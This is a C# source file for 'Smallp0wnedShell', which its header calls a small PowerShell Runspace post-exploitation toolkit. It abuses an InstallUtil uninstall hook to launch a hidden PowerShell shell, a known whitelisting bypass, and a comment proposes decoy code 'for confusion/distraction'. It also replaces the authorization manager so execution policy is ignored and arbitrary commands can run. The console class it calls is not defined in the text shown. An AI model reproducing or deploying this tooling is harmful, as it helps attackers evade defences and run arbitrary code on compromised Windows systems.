

/*
Smallp0wnedShell:
Small version of PowerShell Runspace Post Exploitation Toolkit
Souce p0wnedShell:
https://github.com/Cn33liz/p0wnedShell

*/

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Linq;
using System.Globalization;
using System.Reflection;
using System.IO.Compression;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.DirectoryServices.ActiveDirectory;

using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace p0wnedShell
{
    [System.ComponentModel.RunInstaller(true)]
    public class InstallUtil : System.Configuration.Install.Installer
    {
        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Install(System.Collections.IDictionary savedState)
        {
            //Place Something Here... For Confusion/Distraction			
        }

        //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Program.Main();
        }
    }

    class Program
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern int GetShortPathName(
            [MarshalAs(UnmanagedType.LPTStr)]
            string path,
            [MarshalAs(UnmanagedType.LPTStr)]
            StringBuilder shortPath,
            int shortPathLength
            );

        public static string P0wnedPath()
        {
            string BinaryPath = Assembly.GetExecutingAssembly().CodeBase;
            BinaryPath = BinaryPath.Replace("file:///", string.Empty).Replace("/", @"\");
            BinaryPath = BinaryPath.Remove(BinaryPath.LastIndexOf(@"\"));

            StringBuilder shortPath = new StringBuilder(255);
            GetShortPathName(BinaryPath, shortPath, shortPath.Capacity);
            return (shortPath.ToString());
        }

        public static string DetectProxy()
        {
            string url = "http://www.google.com/";
            // Create a new request to the mentioned URL.				
            HttpWebRequest myWebRequest = (HttpWebRequest)WebRequest.Create(url);

            // Obtain the 'Proxy' of the  Default browser.  
            IWebProxy proxy = myWebRequest.Proxy;
            // Print the Proxy Url to the console.

            string ProxyURL = proxy.GetProxy(myWebRequest.RequestUri).ToString();

            if (ProxyURL != url)
            {
                return ProxyURL.TrimEnd('/');
            }
            else
            {
                return null;
            }
        }


        public static void Main()
        {
            string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            int userInput = 0;
            Pshell.InvokeShell();
        }
    }

    public class Pshell
    {

        public static class EnvironmentHelper
        {
            [DllImport("kernel32.dll")]
            static extern IntPtr GetCurrentProcess();

            [DllImport("kernel32.dll")]
            static extern IntPtr GetModuleHandle(string moduleName);

            [DllImport("kernel32")]
            static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32.dll")]
            static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);

            public static bool Is64BitOperatingSystem()
            {
                // Check if this process is natively an x64 process. If it is, it will only run on x64 environments, thus, the environment must be x64.
                if (Is64BitProcess())
                    return true;
                // Check if this process is an x86 process running on an x64 environment.
                IntPtr moduleHandle = GetModuleHandle("kernel32");
                if (moduleHandle != IntPtr.Zero)
                {
                    IntPtr processAddress = GetProcAddress(moduleHandle, "IsWow64Process");
                    if (processAddress != IntPtr.Zero)
                    {
                        bool result;
                        if (IsWow64Process(GetCurrentProcess(), out result) && result)
                            return true;
                    }
                }
                // The environment must be an x86 environment.
                return false;
            }

            public static bool Is64BitProcess()
            {
                return IntPtr.Size == 8;
            }

            [DllImport("ntdll.dll")]
            private static extern int RtlGetVersion(out RTL_OSVERSIONINFOEX lpVersionInformation);

            [StructLayout(LayoutKind.Sequential)]
            internal struct RTL_OSVERSIONINFOEX
            {
                internal uint dwOSVersionInfoSize;
                internal uint dwMajorVersion;
                internal uint dwMinorVersion;
                internal uint dwBuildNumber;
                internal uint dwPlatformId;
                [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
                internal string szCSDVersion;
            }

            public static decimal RtlGetVersion()
            {
                RTL_OSVERSIONINFOEX osvi = new RTL_OSVERSIONINFOEX();
                osvi.dwOSVersionInfoSize = (uint)Marshal.SizeOf(osvi);
                //const string version = "Microsoft Windows";
                if (RtlGetVersion(out osvi) == 0)
                {
                    string Version = osvi.dwMajorVersion + "." + osvi.dwMinorVersion;
                    return decimal.Parse(Version, CultureInfo.InvariantCulture);
                }
                else
                {
                    return -1;
                }
            }
        }

        private static P0wnedListenerConsole P0wnedListener = new P0wnedListenerConsole();

        public static void InvokeShell()
        {

            P0wnedListener.CommandShell();
        }
 
        //Based on Jared Atkinson's And Justin Warner's Work
        public static string RunPSCommand(string cmd)
        {
            //Init stuff
            InitialSessionState initial = InitialSessionState.CreateDefault();
            // Replace PSAuthorizationManager with a null manager which ignores execution policy
            initial.AuthorizationManager = new System.Management.Automation.AuthorizationManager("MyShellId");

            Runspace runspace = RunspaceFactory.CreateRunspace(initial);
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();

            pipeline.Commands.AddScript(cmd);

            //Prep PS for string output and invoke
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();

            //Convert records to strings
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
            {
                stringBuilder.Append(obj);
            }
            return stringBuilder.ToString();
        }

        public static void RunPSFile(string script)
        {
            PowerShell ps = PowerShell.Create();
            ps.AddScript(script).Invoke();
        }
    }

}
